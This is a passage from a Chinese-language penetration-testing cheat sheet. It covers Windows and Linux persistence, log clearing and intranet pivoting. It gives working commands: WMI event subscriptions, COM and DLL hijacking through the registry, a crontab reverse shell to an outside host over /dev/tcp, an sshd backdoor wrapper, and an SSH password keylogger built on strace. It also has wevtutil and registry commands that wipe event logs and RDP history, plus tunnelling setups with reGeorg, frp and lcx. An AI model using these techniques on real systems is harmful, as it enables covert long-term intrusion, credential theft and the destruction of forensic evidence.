EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"BotConsumer23\", ExecutablePath=\"C:\\Windows\\System32\\notepad.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\notepad.exe\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"BotFilter82\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\" 14\u3001 Userland Persistence With Scheduled Tasks \u00b6 \u52ab\u6301\u8ba1\u5212\u4efb\u52a1UserTask\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7ddll function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = \"HKCU:\\Software\\Classes\\CLSID\\{58fb76b9-ac85-4e55-ac04-427593b1d060}\\InprocServer32\" if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose \"Key already exists, consider using -Force\" exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose \"Created registry entries to hijack the UserTask\" }else{ Write-Warning \"Failed to create registry key, exiting\" exit } } Invoke-ScheduledTaskComHandlerUserTask -Command \"C:\\test\\testmsg.dll\" -Verbose 15\u3001 Netsh \u00b6 netsh add helper c:\\test\\netshtest.dll \u540e\u95e8\u89e6\u53d1\uff1a\u6bcf\u6b21\u8c03\u7528netsh dll\u7f16\u5199: https://github.com/outflanknl/NetshHelperBeacon 16\u3001 Shim \u00b6 \u5e38\u7528\u65b9\u5f0f\uff1a InjectDll RedirectShortcut RedirectEXE 17\u3001 DLL\u52ab\u6301 \u00b6 \u901a\u8fc7Rattler\u81ea\u52a8\u679a\u4e3e\u8fdb\u7a0b\uff0c\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u53ef\u7528dll\u52ab\u6301\u5229\u7528\u7684\u8fdb\u7a0b \u4f7f\u7528\uff1aProcmon\u534a\u81ea\u52a8\u6d4b\u8bd5\u66f4\u7cbe\u51c6\uff0c\u5e38\u89c4\u751f\u6210\u7684dll\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u6267\u884c\u62a5\u9519\u6216\u4e2d\u65ad\uff0c\u4f7f\u7528AheadLib\u914d\u5408\u751f\u6210dll\u52ab\u6301\u5229\u7528\u6e90\u7801\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u6267\u884c \u5de5\u5177\uff1a https://github.com/sensepost/rattler \u5de5\u5177\uff1a https://github.com/Yonsm/AheadLib dll\u52ab\u6301\u4e0d\u591a\u8bf4 18\u3001 DoubleAgent \u00b6 \u7f16\u5199\u81ea\u5b9a\u4e49Verifier provider DLL \u901a\u8fc7Application Verifier\u8fdb\u884c\u5b89\u88c5 \u6ce8\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u6267\u884cpayload \u6bcf\u5f53\u76ee\u6807\u8fdb\u7a0b\u542f\u52a8\uff0c\u5747\u4f1a\u6267\u884cpayload\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u81ea\u542f\u52a8\u7684\u65b9\u5f0f POC : https://github.com/Cybellum/DoubleAgent 19\u3001 waitfor.exe \u00b6 \u4e0d\u652f\u6301\u81ea\u542f\u52a8\uff0c\u4f46\u53ef\u8fdc\u7a0b\u4e3b\u52a8\u6fc0\u6d3b\uff0c\u540e\u53f0\u8fdb\u7a0b\u663e\u793a\u4e3awaitfor.exe POC : https://github.com/3gstudent/Waitfor-Persistence 20\u3001 AppDomainManager \u00b6 \u9488\u5bf9.Net\u7a0b\u5e8f\uff0c\u901a\u8fc7\u4fee\u6539AppDomainManager\u80fd\u591f\u52ab\u6301.Net\u7a0b\u5e8f\u7684\u542f\u52a8\u8fc7\u7a0b\u3002\u5982\u679c\u52ab\u6301\u4e86\u7cfb\u7edf\u5e38\u89c1.Net\u7a0b\u5e8f\u5982powershell.exe\u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u5411\u5176\u6dfb\u52a0payload\uff0c\u5c31\u80fd\u5b9e\u73b0\u4e00\u79cd\u88ab\u52a8\u7684\u540e\u95e8\u89e6\u53d1\u673a\u5236 21\u3001Office \u00b6 \u52ab\u6301Office\u8f6f\u4ef6\u7684\u7279\u5b9a\u529f\u80fd :\u901a\u8fc7dll\u52ab\u6301,\u5728Office\u8f6f\u4ef6\u6267\u884c\u7279\u5b9a\u529f\u80fd\u65f6\u89e6\u53d1\u540e\u95e8 \u5229\u7528VSTO\u5b9e\u73b0\u7684office\u540e\u95e8 Office\u52a0\u8f7d\u9879 Word WLL Excel XLL Excel VBA add-ins PowerPoint VBA add-ins \u53c2\u80031 \uff1a https://3gstudent.github.io/Use-Office-to-maintain-persistence \u53c2\u80032 \uff1a https://3gstudent.github.io/Office-Persistence-on-x64-operating-system 22\u3001 CLR \u00b6 \u65e0\u9700\u7ba1\u7406\u5458\u6743\u9650\u7684\u540e\u95e8\uff0c\u5e76\u80fd\u591f\u52ab\u6301\u6240\u6709.Net\u7a0b\u5e8f POC: https://github.com/3gstudent/CLR-Injection 23\u3001 msdtc \u00b6 \u5229\u7528MSDTC\u670d\u52a1\u52a0\u8f7ddll\uff0c\u5b9e\u73b0\u81ea\u542f\u52a8\uff0c\u5e76\u7ed5\u8fc7Autoruns\u5bf9\u542f\u52a8\u9879\u7684\u68c0\u6d4b \u5229\u7528\uff1a\u5411 %windir%\\system32\\\u76ee\u5f55\u6dfb\u52a0dll\u5e76\u91cd\u547d\u540d\u4e3aoci.dll 24\u3001 Hijack CAccPropServicesClass and MMDeviceEnumerato \u00b6 \u5229\u7528COM\u7ec4\u4ef6\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u5b9e\u73b0 POC\uff1a https://github.com/3gstudent/COM-Object-hijacking 25\u3001 Hijack explorer.exe \u00b6 COM\u7ec4\u4ef6\u52ab\u6301\uff0c\u4e0d\u9700\u8981\u91cd\u542f\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u5b9e\u73b0 HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1} HKCU\\Software\\Classes\\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9} HKCU\\Software\\Classes\\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} HKCU\\Software\\Classes\\Wow6432Node\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E} 26\u3001Windows FAX DLL Injection \u00b6 \u901a\u8fc7DLL\u52ab\u6301\uff0c\u52ab\u6301Explorer.exe\u5bf9 fxsst.dll \u7684\u52a0\u8f7d Explorer.exe\u5728\u542f\u52a8\u65f6\u4f1a\u52a0\u8f7d c:\\Windows\\System32\\fxsst.dll (\u670d\u52a1\u9ed8\u8ba4\u5f00\u542f\uff0c\u7528\u4e8e\u4f20\u771f\u670d\u52a1)\u5c06payload.dll\u4fdd\u5b58\u5728 c:\\Windows\\fxsst.dll \uff0c\u80fd\u591f\u5b9e\u73b0dll\u52ab\u6301\uff0c\u52ab\u6301Explorer.exe\u5bf9 fxsst.dll \u7684\u52a0\u8f7d 27\u3001\u7279\u6b8a\u6ce8\u518c\u8868\u952e\u503c \u00b6 \u5728\u6ce8\u518c\u8868\u542f\u52a8\u9879\u521b\u5efa\u7279\u6b8a\u540d\u79f0\u7684\u6ce8\u518c\u8868\u952e\u503c\uff0c\u7528\u6237\u6b63\u5e38\u60c5\u51b5\u4e0b\u65e0\u6cd5\u8bfb\u53d6(\u4f7f\u7528Win32 API)\uff0c\u4f46\u7cfb\u7edf\u80fd\u591f\u6267\u884c(\u4f7f\u7528Native API)\u3002 \u300a\u6e17\u900f\u6280\u5de7\u2014\u2014\u201c\u9690\u85cf\u201d\u6ce8\u518c\u8868\u7684\u521b\u5efa\u300b \u300a\u6e17\u900f\u6280\u5de7\u2014\u2014\u201c\u9690\u85cf\u201d\u6ce8\u518c\u8868\u7684\u66f4\u591a\u6d4b\u8bd5\u300b 28\u3001\u5feb\u6377\u65b9\u5f0f\u540e\u95e8 \u00b6 \u66ff\u6362\u6211\u7684\u7535\u8111\u5feb\u6377\u65b9\u5f0f\u542f\u52a8\u53c2\u6570 POC : https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1 29\u3001 Logon Scripts \u00b6 New-ItemProperty \"HKCU:\\Environment\\\" UserInitMprLogonScript -value \"c:\\test\\11.bat\" -propertyType string | Out-Null 30\u3001 Password Filter DLL \u00b6 31\u3001 \u5229\u7528BHO\u5b9e\u73b0IE\u6d4f\u89c8\u5668\u52ab\u6301 \u00b6 Linux \u00b6 crontab \u00b6 \u6bcf60\u5206\u949f\u53cd\u5f39\u4e00\u6b21shell\u7ed9dns.wuyun.org\u768453\u7aef\u53e3 #!bash (crontab -l;printf \"*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\")|crontab - \u786c\u94fe\u63a5sshd \u00b6 #!bash ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333; \u94fe\u63a5\uff1assh root@192.168.206.142 -p 2333 SSH Server wrapper \u00b6 #!bash cd /usr/sbin mv sshd ../bin echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if (getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec {\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd //\u4e0d\u7528\u91cd\u542f\u4e5f\u884c /etc/init.d/sshd restart socat STDIO TCP4:192.168.206.142:22,sourceport=13377 SSH keylogger \u00b6 vim\u5f53\u524d\u7528\u6237\u4e0b\u7684.bashrc\u6587\u4ef6,\u672b\u5c3e\u6dfb\u52a0 #!bash alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' source .bashrc Cymothoa_\u8fdb\u7a0b\u6ce8\u5165backdoor \u00b6 ./cymothoa -p 2270 -s 1 -y 7777 nc -vv ip 7777 rootkit \u00b6 openssh_rootkit Kbeast_rootkit Mafix + Suterusu rootkit Tools \u00b6 Vegile backdoor 14.\u75d5\u8ff9\u6e05\u7406 \u00b6 Windows\u65e5\u5fd7\u6e05\u9664 \u00b6 \u83b7\u53d6\u65e5\u5fd7\u5206\u7c7b\u5217\u8868\uff1a wevtutil el >1.txt \u83b7\u53d6\u5355\u4e2a\u65e5\u5fd7\u7c7b\u522b\u7684\u7edf\u8ba1\u4fe1\u606f\uff1a eg. wevtutil gli \"windows powershell\" \u56de\u663e\uff1a creationTime: 2016-11-28T06:01:37.986Z lastAccessTime: 2016-11-28T06:01:37.986Z lastWriteTime: 2017-08-08T08:01:20.979Z fileSize: 1118208 attributes: 32 numberOfLogRecords: 1228 oldestRecordNumber: 1 \u67e5\u770b\u6307\u5b9a\u65e5\u5fd7\u7684\u5177\u4f53\u5185\u5bb9\uff1a wevtutil qe /f:text \"windows powershell\" \u5220\u9664\u5355\u4e2a\u65e5\u5fd7\u7c7b\u522b\u7684\u6240\u6709\u4fe1\u606f\uff1a wevtutil cl \"windows powershell\" \u7834\u574fWindows\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd \u00b6 \u5229\u7528\u5de5\u5177 Invoke-Phant0m Windwos-EventLog-Bypass Metasploit \u00b6 run clearlogs clearev 3389\u767b\u9646\u8bb0\u5f55\u6e05\u9664 \u00b6 @echo off @reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f @del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a @exit 15.\u5185\u7f51\u7a7f\u900f \u00b6 \u533a\u5206\u6b63\u5411\u4ee3\u7406\u4e0e\u53cd\u5411\u4ee3\u7406 A\u2014-b\u2014-C A\u53bb\u8bf7\u6c42C,B\u4f5c\u4e3a\u4ee3\u7406\uff0c\u4ee3\u66ffA\u53bb\u8bbf\u95eeC\uff0c\u5e76\u5c06\u8fd4\u56de\u7684\u7ed3\u679c\u8f6c\u53d1\u7ed9A \u90a3\u4e48B\u5c31\u662f\u6b63\u5411\u4ee3\u7406 B\u4e3b\u52a8\u4e0eA\u76848888\u7aef\u53e3\u8fde\u63a5\uff0c\u5e76\u5c06A:8888\u7684\u8bbf\u95ee\u8f6c\u53d1\u5230C:80\u4e0a\u53bb\uff0c\u5e76\u5c06\u7ed3\u679c\u8f6c\u53d1\u7ed9A,\u5219B\u662f\u53cd\u5411\u4ee3\u7406 \u53cd\u5411\u4ee3\u7406\u4f18\u52bf: \u5f53AB\u4e4b\u95f4\u6709\u9632\u706b\u5899\uff0c\u4e0d\u5141\u8bb8A\u8fdeB,\u4f46\u662f\u5141\u8bb8B\u8fdeA 0x01 \u573a\u666f\u4e0e\u601d\u8def\u5206\u6790 \u00b6 \u573a\u666f\u4e00\uff1a\u5185\u7f51\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236 \u00b6 \u601d\u8def \uff1a\u7531\u4e8e\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236\uff0c\u6211\u4eec\u7684\u53ef\u9009\u62e9\u7684\u65b9\u6848\u975e\u5e38\u7075\u6d3b\uff0c\u5982\uff1a\u53cd\u5f39shell \u573a\u666f\u4e8c\uff1a\u5185\u7f51\u9632\u706b\u5899\u4ec5\u5141\u8bb8\u5185\u7f51\u4e3b\u673a\u8bbf\u95ee\u5916\u7f51\u7684\u7279\u5b9a\u7aef\u53e3\uff08\u5982\uff1a80, 443\uff09 \u00b6 \u601d\u8def\uff1a\u7531\u4e8e\u9632\u706b\u5899\u4ec5\u5141\u8bb8\u90e8\u5206\u7279\u5b9a\u5916\u7f51\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\uff0c\u601d\u8def\u4e00\u4ecd\u7136\u662f\u53cd\u5f39shell\u53ea\u4e0d\u8fc7\u76ee\u6807\u7aef\u53e3\u6539\u6210\u7279\u5b9a\u7aef\u53e3\u5373\u53ef\uff1b\u601d\u8def\u4e8c\u5219\u662f\u7aef\u53e3\u8f6c\u53d1\uff0c\u5c06\u5185\u7f51\u4e3b\u673a\u7684\u67d0\u4e9b\u670d\u52a1\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u5916\u7f51\u653b\u51fb\u4e3b\u673a\u4e0a\u7684\u9632\u706b\u5899\u5141\u8bb8\u7684\u7279\u5b9a\u7aef\u53e3\u4e0a\uff0c\u518d\u901a\u8fc7\u8fde\u63a5\u5916\u7f51\u4e3b\u673a\u4e0a\u7684\u672c\u5730\u7aef\u53e3\u6765\u8bbf\u95ee\u5185\u7f51\u670d\u52a1 \u65b9\u6cd5\u4e00\uff1a\u53cd\u5f39shell\u53ef\u53c2\u8003\u573a\u666f\u4e00\u4e2d\u7684\u65b9\u6cd5\uff0c\u4ec5\u9700\u4fee\u6539\u76ee\u6807\u7aef\u53e3\u4e3a\u9632\u706b\u5899\u5141\u8bb8\u7684\u7279\u5b9a\u7aef\u53e3\u5373\u53ef \u65b9\u6cd5\u4e8c\uff1a\u7aef\u53e3\u8f6c\u53d1 \u65b9\u6cd5\u4e09\uff1aSSH\u7684\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\u914d\u5408proxychains\u6765\u4ee3\u7406\u6240\u6709\u6d41\u91cf\u8fdb\u4e00\u6b65\u6e17\u900f\u5185\u7f51 1.\u5728\u5185\u7f51\u4e3b\u673a\u4e0a\u6267\u884c ssh -f -N -R 2222:127.0.0.1:22 -p 80 root@192.168.0.230 (\u8f93\u5165\u5916\u7f51\u4e3b\u673a\u7684SSH\u53e3\u4ee4) 2.\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u6267\u884c ssh -f -N -D 127.0.0.1:8080 -p 2222 avfisher@127.0.0.1 (\u8f93\u5165\u5185\u7f51\u4e3b\u673a\u7684SSH\u53e3\u4ee4) 3.\u5728\u5916\u7f51\u4e3b\u673a\u4e0a\u914d\u7f6eproxychains\u8bbe\u7f6esocks4\u4ee3\u7406 $ vim /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 8080 4.\u4f7f\u7528proxychains\u4ee3\u7406\u6240\u6709\u6d41\u91cf\u8fdb\u5165\u5185\u7f51 proxychains nc -nv 10.0.2.5 3306 \u573a\u666f\u4e09\uff1aTCP\u4e0d\u51fa\u7f51-HTTP\u4ee3\u7406 \u00b6 \u4e00.reGeorg reGeorg\u539f\u7248\uff1a https://github.com/sensepost/reGeorg reGeorg\u4fee\u6539\u7248\uff1a https://github.com/L-codes/Neo-reGeorg \u5047\u8bbe\u62ff\u5230\u7684Webshell\u662f http://aaa.com/shell.jsp\uff0c \u4ee5\u539f\u7248reGeorg\u4e3a\u4f8b\u3002 \u4e0a\u4f20reGeorg\u4e2d\u7684 tunnel.jsp\uff0c\u5047\u8bbe\u5f53\u524dURL\u4e3ahttp://aaa.com/tunnel.jsp \u5728\u672c\u5730PC\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4 python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp \u6b64\u65f6\uff0c\u5c06\u5728\u672c\u5730PC\u76848080\u5f00\u542f\u4e00\u4e2aSocks\u7aef\u53e3\uff0c\u4f7f\u7528Proxifier\u5373\u53ef\u8fdb\u884c\u4ee3\u7406\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u4e2ahttp\u4ee3\u7406\u96a7\u9053\u6bd4\u8f83\u8106\u5f31\uff0c\u5efa\u8bae\u6839\u636e\u6bcf\u4e2a\u76ee\u6807host\u5355\u72ec\u6dfb\u52a0\u89c4\u5219\uff0c\u6700\u597d\u4e0d\u8981\u8bbe\u7f6e\u6210\u5168\u5c40\u4ee3\u7406\u3002 \u4e8c.pystinger \u8702\u523a-stinger_client pystinger \u6574\u4f53\u7ed3\u6784\uff1a 1.\u4e0a\u4f20 proxy.jsp\u5230\u76ee\u6807Web\u670d\u52a1\u5668\uff0c\u4e0a\u4f20stinger_server/stinger_server.exe\u5230\u76ee\u6807\u7cfb\u7edf\u3002 2.\u4f7f\u7528Webshell\u542f\u52a8stinger_server Linux: chmod +x /tmp/stinger_server nohup /tmp/stinger_server>/dev/null nohup.out & Windows: start D:/XXX/stinger_server.exe 3.VPS\u670d\u52a1\u7aef\u542f\u52a8\u76d1\u542c ./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000 \u4ee5\u4e0a\u64cd\u4f5c\u6210\u529f\u540e\uff0cVPS\u4f1a\u76d1\u542c60000\u7aef\u53e3\uff0c\u63a5\u4e0b\u6765\u76f4\u63a5\u914d\u7f6e\u597dProxifier\u5c31\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u5185\u7f51\u4e86\u3002 \u7279\u522b\u6ce8\u610f\uff1a\u8fd9\u4e2a\u4ee3\u7406\u4e5f\u4e0d\u662f\u5f88\u7a33\u5b9a\uff0c\u6709\u65f6\u5019\u4f1a\u65ad\u5f00(Wrong data)\u3002\u9047\u5230\u65ad\u5f00\u60c5\u51b5\u540e\uff0c\u624b\u52a8kill stinger_server\u8fdb\u7a0b \u518d\u542f\u52a8\uff0c\u6700\u540e\u91cd\u542fVPS\u670d\u52a1\u7aefstinger_client\u5373\u53ef \u573a\u666f\u56db TCP\u51fa\u7f51-socks\u4ee3\u7406 \u00b6 frp \u642d\u5efa\u6b65\u9aa4\uff1a 1.VPS\u8fd0\u884c\u670d\u52a1\u7aef ./frps -c frps.ini \u6ce8\uff1a\u5efa\u8bae\u7528Screen\u5c06frp\u6302\u8d77\u5230\u540e\u53f0\uff0cScreen\u6302\u8d77\u7a0b\u5e8f\u53c2\u8003 \u7528screen \u5728\u540e\u53f0\u8fd0\u884c\u7a0b\u5e8f - \u7b80\u4e66 frps.ini\u5185\u5bb9\uff1a [common] bind_port = 8080 tls_only = true tcp_mux = true privilege_token = token123 kcp_bind_port = 8080 2.\u4f7f\u7528VPS\u5c06frpc frpc.ini\u4e0a\u4f20\u5230\u4e3b\u673atmp\u76ee\u5f55\uff0c\u7136\u540e\u8fd0\u884c Linux: chmod +x /tmp/frpc-x86 nohup /tmp/frpc-x86 -c /tmpfrpc.ini>/dev/null nohup.out & Windows frpc -c frpc.ini \u6ce8\uff1a\u6709\u65f6\u5019\u7528Webshell\u7ba1\u7406\u5de5\u5177\u4f1a\u4e0a\u4f20\u5931\u8d25\u6216\u4e0a\u4f20\u6587\u4ef6\u4e0d\u5b8c\u6574\uff0c\u53ef\u4ee5cd\u5230frp\u76ee\u5f55\uff0c\u5728vps\u4f7f\u7528 python -m SimpleHTTPServer 80 \u542f\u52a8\u4e00\u4e2awebserver\uff0c\u7136\u540e\u5728\u5ba2\u6237\u7aef\u4f7f\u7528 curl http://vpsip/frpc \u4e0b\u8f7d\u6587\u4ef6\u3002 \u4ee5\u4e0a\u64cd\u4f5c\u6210\u529f\u540e\uff0cVPS\u63a7\u5236\u53f0\u4f1a\u6709\u8f93\u51fa\uff0c\u7136\u540eVPS\u4f1a\u542f\u52a8\u4e00\u4e2a10001\u7aef\u53e3\uff0c\u63a5\u4e0b\u6765\u76f4\u63a5\u914d\u7f6e\u597dProxifier\u5c31\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u5185\u7f51\u4e86\u3002 Proxifier\u4f7f\u7528\u53c2\u8003\uff1a Proxifier Socks5 \u4ee3\u7406\uff08\u5185\u7f51\u8bbf\u95ee\u3001\u8fdc\u7a0b\u529e\u516c\uff09 ps\uff1afrp\u4f1a\u6d89\u53ca\u5230\u514d\u6740\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u63a8\u8350\u53e6\u4e00\u4e2a\u4ee3\u7406\u5de5\u5177\uff0c\u4f53\u79ef\u66f4\u5c0f\uff0c\u53ef\u4ee5\u770b\u4f5c\u662frust\u7248\u672c\u7684frp fuso 0x02 Lcx \u00b6 \u5185\u7f51IP\uff1a192.168.183.168 \u516c\u7f51IP\uff1a192.168.183.181 \u7aef\u53e3\u8f6c\u53d1 \u00b6 \u5185\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe \u2013slave \u516c\u7f51IP \u7aef\u53e3 \u5185\u7f51IP \u7aef\u53e3 \u5c06\u5185\u7f51\u76843389\u7aef\u53e3\u8f6c\u53d1\u5230\u516c\u7f51\u76846666\u7aef\u53e3 lcx.exe -slave 192.168.183.181 6666 192.168.183.168 3389 lcx.exe -slave 192.168.183.181 6666 127.0.0.1 3389 \u516c\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe -listen \u76d1\u542c\u7aef\u53e3 \u8fde\u63a5\u7aef\u53e3 \u5c06\u57286666\u7aef\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u8f6c\u53d1\u52302222\u7aef\u53e3 lcx.exe -listen 6666 2222 \u4f7f\u7528\u547d\u4ee4 mstsc /v:127.0.0.1:2222 \u5373\u53ef\u8fde\u63a5\u5230\u5185\u7f513389\u7aef\u53e3 \u7aef\u53e3\u6620\u5c04 \u00b6 \u5982\u679c\u5185\u7f51\u673a\u5668\u9632\u706b\u5899\u7981\u6b623389\u51fa\u7ad9\uff0c\u53ef\u4ee5\u4f7f\u7528tran\u547d\u4ee4\u5c063389\u7aef\u53e3\u6620\u5c04\u5230\u5176\u4ed6\u7aef\u53e3\u4e0a \u5185\u7f51\u673a\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff1a lcx.exe -tran \u6620\u5c04\u7aef\u53e3 \u8fde\u63a5IP \u8fde\u63a5\u7aef\u53e3 lcx.exe -tran 66 192.168.183.168 3389 \u56e0\u4e3a\u5b9e\u9a8c\u73af\u5883\u662f\u5185\u7f51\u6240\u4ee5\u76f4\u63a5\u8fde\u63a566\u7aef\u53e3\u5373\u53ef\u8bbf\u95ee3389\u7aef\u53e3\uff0c\u516c\u7f51\u8fd8\u9700\u8981\u7aef\u53e3\u8f6c\u53d1 0x03 SSH\u96a7\u9053 \u00b6 ssh\u53c2\u6570\u8be6\u89e3\uff1a -C Enable compression \u538b\u7f29\u6570\u636e\u4f20\u8f93 -q Quiet mode. \u5b89\u9759\u6a21\u5f0f -T Disable pseudo-tty allocation. \u4e0d\u5360\u7528 shell -f Requests ssh to go to background just before command execution. \u540e\u53f0\u8fd0\u884c\uff0c\u5e76\u63a8\u8350\u52a0\u4e0a -n \u53c2\u6570 -N Do not execute a remote command. \u4e0d\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4\uff0c\u7aef\u53e3\u8f6c\u53d1\u5c31\u7528\u5b83 -L port:host:hostport \u5c06\u672c\u5730\u673a(\u5ba2\u6237\u673a)\u7684\u67d0\u4e2a\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7aef\u6307\u5b9a\u673a\u5668\u7684\u6307\u5b9a\u7aef\u53e3. -R port:host:hostport \u5c06\u8fdc\u7a0b\u4e3b\u673a(\u670d\u52a1\u5668)\u7684\u67d0\u4e2a\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u7aef\u6307\u5b9a\u673a\u5668\u7684\u6307\u5b9a\u7aef\u53e3. -D port \u6307\u5b9a\u4e00\u4e2a\u672c\u5730\u673a\u5668\u52a8\u6001\u7684\u5e94\u7528\u7a0b\u5e8f\u7aef\u53e3\u8f6c\u53d1. -g port \u5141\u8bb8\u8fdc\u7a0b\u4e3b\u673a\u8fde\u63a5\u5230\u5efa\u7acb\u7684\u8f6c\u53d1\u7684\u7aef\u53e3\uff0c\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ea\u5141\u8bb8\u672c\u5730\u4e3b\u673a\u5efa\u7acb\u8fde\u63a5 SSH\u672c\u5730\u8f6c\u53d1 \u00b6 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host \u8fdc\u7a0b\u7ba1\u7406\u670d\u52a1\u5668\u4e0a\u7684mysql\uff0cmysql\u4e0d\u80fd\u76f4\u63a5root\u8fdc\u7a0b\u767b\u9646\u3002\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u901a\u8fc7\u672c\u5730\u8f6c\u53d1\uff0c\u901a\u8fc7ssh\u5c06\u670d\u52a1\u5668\u76843306\u7aef\u53e3\u8f6c\u53d1\u52301234\u7aef\u53e3\u3002 ssh -CfNg -L 2222:127.0.0.1:3306 root@139.196.xx.xx \u5de5\u4f5c\u539f\u7406\uff1a\u5728\u672c\u5730\u6307\u5b9a\u4e00\u4e2a\u7531ssh\u76d1\u542c\u7684\u8f6c\u53d1\u7aef\u53e32222\uff0c\u5c06\u8fdc\u7a0b\u4e3b\u673a\u76843306\u7aef\u53e3(127.0.0.1:3306)\u6620\u5c04\u5230\u672c\u5730\u76842222\u7aef\u53e3\uff0c\u5f53\u6709\u4e3b\u673a\u8fde\u63a5\u672c\u5730\u6620\u5c04\u76842222\u7aef\u53e3\u65f6\uff0c\u672c\u5730ssh\u5c31\u5c06\u6b64\u7aef\u53e3\u7684\u6570\u636e\u5305\u8f6c\u53d1\u7ed9\u4e2d\u95f4\u4e3b\u673aVPS\uff0c\u7136\u540eVPS\u518d\u4e0e\u8fdc\u7a0b\u4e3b\u673a\u7aef\u53e3(127.0.0.1:3306)\u901a\u4fe1\u3002 \u6570\u636e\u6d41\u5411\uff1aKali -> 2222 -> VPS -> 127.0.0.1:3306 SSH\u8fdc\u7a0b\u8f6c\u53d1 \u00b6 \u8bed\u6cd5\u683c\u5f0f\uff1a ssh -R [bind_addr:]remote1_port:host:port remote1 \u5047\u8bbekali\u5f00\u4e86\u4e00\u4e2a80\u7aef\u53e3\u7684web\u670d\u52a1\uff0c\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f7f\u7528\u8fdc\u7a0b\u8f6c\u53d1\uff0c\u5c06kali\u768480\u7aef\u53e3\u8f6c\u53d1\u5230\u5916\u7f51\u7684\u5176\u4ed6\u7aef\u53e3\uff0c\u8fd9\u65f6\u5019\u8bbf\u95ee\u5916\u7f51\u7684\u7aef\u53e3\uff0c\u5c31\u8bbf\u95ee\u5230\u4e86\u5185\u7f51\u7684\u7aef\u53e3\u3002 ssh -CfNg -R 4444:127.0.0.1:80 root@192.168.183.195 \u6b64\u65f6\u5728192.168.183.195\u8fd9\u53f0\u4e3b\u673a\u4e0a\u8bbf\u95ee127.0.0.1:4444\u7aef\u53e3\u5373\u53ef\u8bbf\u95ee\u5230kali\u768480\u7aef\u53e3 